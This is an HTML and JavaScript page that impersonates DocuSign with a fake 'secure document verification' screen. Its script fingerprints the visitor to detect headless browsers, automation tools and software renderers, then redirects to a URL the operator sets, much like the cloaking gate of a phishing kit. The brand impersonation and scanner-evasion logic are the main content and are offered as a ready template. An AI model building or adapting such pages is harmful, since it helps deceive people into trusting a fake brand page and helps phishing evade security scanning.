<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign® | Secure Document Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            padding: 40px 30px;
            color: white;
            text-align: center;
        }

        .logo {
            font-size: 48px;
            margin-bottom: 15px;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
            font-weight: 500;
        }

        .content {
            padding: 40px 30px;
        }

        .status-box {
            background: #f0f6ff;
            border: 2px solid #2a5298;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }

        .status-icon {
            font-size: 48px;
            margin-bottom: 12px;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .status-text {
            color: #1e3c72;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .status-desc {
            color: #666;
            font-size: 13px;
            line-height: 1.5;
        }

        .footer {
            background: #f9fafb;
            padding: 20px 30px;
            border-top: 1px solid #e5e7eb;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #9ca3af;
        }

        .footer-left, .footer-right {
            display: flex;
            gap: 12px;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #059669;
            font-weight: 600;
        }

        .security-badge i {
            font-size: 14px;
        }

        .ref-code {
            background: #f0f6ff;
            padding: 2px 8px;
            border-radius: 4px;
            color: #2a5298;
            font-family: 'Courier New', monospace;
            font-weight: 600;
        }

        .verification-complete {
            text-align: center;
            color: #059669;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <!-- HEADER -->
        <div class="header">
            <div class="logo">🔐</div>
            <h1>DocuSign®</h1>
            <p>Secure Document Verification</p>
        </div>

        <!-- CONTENT -->
        <div class="content">
            <!-- STATUS BOX -->
            <div class="status-box">
                <div class="status-icon" id="statusIcon">⏳</div>
                <div class="status-text" id="statusText">Verifying Access</div>
                <div class="status-desc" id="statusDesc">
                    Your browser security is being verified. Please wait...
                </div>
            </div>

            <!-- VERIFICATION STATUS -->
            <div id="verificationStatus" style="display: none;">
                <div class="verification-complete">
                    ✓ Verification Successful
                </div>
            </div>
        </div>

        <!-- FOOTER -->
        <div class="footer">
            <div class="footer-left">
                <span class="security-badge">
                    <i class="fas fa-shield-alt"></i> TLS 1.3
                </span>
            </div>
            <div class="footer-right">
                <span>REF-<span id="ref"></span></span>
            </div>
        </div>
    </div>
</div>

<script>
(function(){
    "use strict";

    // ==================== CONFIGURATION ====================
    var REDIRECT_URL = "#";  // CHANGE THIS TO YOUR REDIRECT URL
    var REDIRECT_DELAY = 5000;  // 5 seconds before redirect
    
    // ========================================================

    var statusIcon = document.getElementById("statusIcon");
    var statusText = document.getElementById("statusText");
    var statusDesc = document.getElementById("statusDesc");
    var verificationStatus = document.getElementById("verificationStatus");
    var ref = document.getElementById("ref");

    // Generate reference code
    ref.textContent = Math.random().toString(36).substring(2, 10).toUpperCase();

    // ==================== BOT DETECTION LOGIC ====================

    function botScore() {
        var score = 0;
        var ua = navigator.userAgent;
        var uaLower = ua.toLowerCase();

        if (navigator.webdriver) {
            score += 40;
        }

        var autoStrings = ["headless", "phantom", "selenium", "puppeteer", "playwright", "cypress"];
        for (var i = 0; i < autoStrings.length; i++) {
            if (uaLower.indexOf(autoStrings[i]) !== -1) {
                score += 30;
                break;
            }
        }

        if (!navigator.plugins || navigator.plugins.length === 0) score += 20;
        if (!navigator.languages || navigator.languages.length === 0) score += 15;

        var isChromeUA = /chrome/i.test(ua) && !/edg/i.test(ua);
        if (isChromeUA && !window.chrome) score += 25;

        if (navigator.permissions && typeof navigator.permissions.query !== "function") score += 10;

        var hc = navigator.hardwareConcurrency;
        if (hc === 0 || hc === undefined) score += 12;

        if (screen.width < 200 || screen.height < 200) score += 25;

        if (window.outerWidth === window.innerWidth && window.outerHeight === window.innerHeight) score += 20;

        var hasTouch = ("ontouchstart" in window) || navigator.maxTouchPoints > 0;
        var isMobileUA = /mobi|android|iphone/i.test(ua);
        if (isMobileUA && !hasTouch) score += 12;

        return score;
    }

    function canvasFingerprint() {
        try {
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            if (!ctx) return { suspicious: true };
            ctx.fillText("test", 0, 0);
            return { suspicious: false };
        } catch (e) {
            return { suspicious: true };
        }
    }

    function webglFingerprint() {
        try {
            var canvas = document.createElement("canvas");
            var gl = canvas.getContext("webgl");
            if (!gl) return { suspicious: false };
            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (!debugInfo) return { suspicious: false };
            var renderer = (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
            var headlessRenderers = ["swiftshader", "llvmpipe", "softpipe", "mesa offscreen"];
            for (var i = 0; i < headlessRenderers.length; i++) {
                if (renderer.indexOf(headlessRenderers[i]) !== -1) return { suspicious: true };
            }
            return { suspicious: false };
        } catch (e) {
            return { suspicious: true };
        }
    }

    var humanSignals = 0;
    document.addEventListener("mousemove", function() { humanSignals++; }, { passive: true });
    document.addEventListener("click", function() { humanSignals += 2; }, { passive: true });
    document.addEventListener("keydown", function() { humanSignals++; }, { passive: true });
    document.addEventListener("touchstart", function() { humanSignals += 3; }, { passive: true });

    // ==================== START VERIFICATION ====================

    var totalScore = 0;
    var threshold = 50;

    totalScore += botScore();

    var fps = canvasFingerprint();
    if (fps.suspicious) totalScore += 20;

    var wgl = webglFingerprint();
    if (wgl.suspicious) totalScore += 25;

    if (humanSignals < 1) totalScore += 15;

    // ==================== REDIRECT LOGIC ====================

    setTimeout(function() {
        var isBot = totalScore >= threshold;

        if (isBot) {
            statusIcon.textContent = "❌";
            statusText.textContent = "Access Denied";
            statusDesc.textContent = "Bot detection triggered. Access not permitted.";
            
            console.log({
                verdict: "BOT_DETECTED",
                score: totalScore,
                threshold: threshold
            });

            // Still redirect after delay
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, REDIRECT_DELAY);
        } else {
            statusIcon.textContent = "✓";
            statusText.textContent = "Verification Successful";
            statusDesc.textContent = "Your browser passed security checks.";
            verificationStatus.style.display = "block";

            console.log({
                verdict: "HUMAN_VERIFIED",
                score: totalScore,
                threshold: threshold
            });

            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, REDIRECT_DELAY);
        }
    }, 1000);

})();
</script>

</body>
</html>
